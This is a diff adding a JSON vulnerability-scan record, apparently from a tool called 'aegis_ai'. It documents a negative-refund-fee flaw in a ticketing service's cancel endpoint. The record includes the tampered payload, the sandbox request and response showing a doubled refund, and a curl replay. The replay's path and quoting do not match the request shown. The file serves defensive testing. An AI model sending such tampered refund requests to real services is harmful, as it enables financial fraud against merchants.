@@ -1,0 +1,35 @@
+{
+  "tool": "aegis_ai",
+  "target_id": "TGT-009",
+  "static_findings": [],
+  "ml_prediction": {
+    "vulnerability_type": "Business Logic: Refund Fee & Amount Tampering",
+    "cwe_id": "CWE-840",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "confidence": 0.96,
+    "fix_suggestion": "recalculate_policy_fee_on_server_db(ticket_id)"
+  },
+  "logic_scenario": {
+    "domain": "Ticketing Service",
+    "target_flow": "User -> Reservation -> Payment -> Cancel & Refund",
+    "vulnerability_detected": "Negative Refund Fee Double Payout",
+    "impact": "Critical financial asset loss via negative fee subtraction",
+    "exploit_payload": {
+      "ticket_id": "TKT-VIP-1029",
+      "original_price": 150000,
+      "refund_fee": -150000
+    }
+  },
+  "verified_evidence": {
+    "evidence_id": "EV-20260803-99182",
+    "timestamp_utc": "2026-08-03T15:11:57.000Z",
+    "sandbox_container_id": "cnt-sandbox-sbx-ticket-99812",
+    "sha256_hash": "f8f919f3af05679c73b8289ce7fdabff1be1197d552a33ed6b5f8e7204d0da60",
+    "request_packet": "POST /api/v1/tickets/cancel HTTP/1.1\nHost: 127.0.0.1:18090\nContent-Type: application/json\n\n{'ticket_id': 'TKT-VIP-1029', 'original_price': 150000, 'refund_fee': -150000}",
+    "response_packet": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"REFUND_APPROVED\", \"total_refund_amount\": 300000}",
+    "curl_replay": "curl -X POST 'http://127.0.0.1:18090/api/tgt-009' -H 'Content-Type: application/json' -d '{'ticket_id': 'TKT-VIP-1029', 'original_price': 150000, 'refund_fee': -150000}'",
+    "verdict": "HYPOTHESIS_PROVEN_REPRODUCIBLE"
+  },
+  "duration_seconds": 0.0
+}
